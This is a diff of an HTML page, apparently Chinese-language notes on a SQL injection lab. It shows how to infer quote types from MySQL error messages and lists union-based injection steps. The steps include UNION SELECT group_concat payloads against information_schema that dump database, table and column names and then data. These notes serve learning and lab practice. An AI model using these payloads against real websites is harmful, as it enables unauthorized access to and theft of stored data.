@@ -212,15 +212,23 @@
         <p>一、加上单引号报错有输出结果</p>
 <p>​		1、near ‘’1’’ LIMIT 0,1’ at line 1   &#x3D;&gt; 去掉1左边的所有东西，再去掉输入的1’，得到类型为单引号 &#x3D;&gt; <strong>’</strong></p>
 <p>​		2、near ‘’ LIMIT 0,1’ at line 1   &#x3D;&gt; 去掉左边的所有东西，再去掉输入的1’（没有），得到类型为整型 &#x3D;&gt; <strong>空</strong></p>
-<p>​			解答步骤：（1）判断字段数(使用order by)</p>
-<p>​									（2）判断输出结果的位置(使用select from)</p>
-<p>​									（3）查数据库名：union select group_concat(schema_name) from information_schema.schemata %23</p>
-<p>​									（4）查表名：union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;‘上方查到的数据库’ %23</p>
-<p>​									（5）查列名：union select group_concat(column_name) from information_schema.columns where table_schema &#x3D;’上方查到的数据库’ and table_name&#x3D;’上方查到的表名’ %23</p>
-<p>​									（6）查字段：union select group_concat(想要查询的字段) from 查询到的列名 %23</p>
 <p>​		3、near ‘’1’’) LIMIT 0,1’ at line 1   &#x3D;&gt; 去掉1左边的所有东西，再去掉输入的1’，得到类型为单引号变形 &#x3D;&gt; <strong>’）</strong></p>
+<p>解答步骤：</p>
+<p>（1）判断字段数(使用order by)</p>
+<p>（2）判断输出结果的位置(使用select from)</p>
+<p>（3）查数据库名：union select group_concat(schema_name) from information_schema.schemata %23</p>
+<p>（4）查表名：union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;‘上方查到的数据库’ %23</p>
+<p>（5）查列名：union select group_concat(column_name) from information_schema.columns where table_schema &#x3D;’上方查到的数据库’ and table_name&#x3D;’上方查到的表名’ %23</p>
+<p>（6）查字段：union select group_concat(想要查询的字段) from 查询到的列名 %23</p>
 <p>二、加上双引号报错有输出结果</p>
 <p>​		1、near ‘“1””) LIMIT 0,1’ at line 1   &#x3D;&gt; 去掉1左边的所有东西，再去掉输入的1“，得到类型为双引号变形 &#x3D;&gt; <strong>”）</strong></p>
+<p>解答步骤：</p>
+<p>（1）判断字段数(使用order by)</p>
+<p>（2）判断输出结果的位置(使用select from)</p>
+<p>（3）查数据库名：union select group_concat(schema_name) from information_schema.schemata %23</p>
+<p>（4）查表名：union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;‘上方查到的数据库’ %23</p>
+<p>（5）查列名：union select group_concat(column_name) from information_schema.columns where table_schema &#x3D;’上方查到的数据库’ and table_name&#x3D;’上方查到的表名’ %23</p>
+<p>（6）查字段：union select group_concat(想要查询的字段) from 查询到的列名 %23</p>
 
       
     </div>
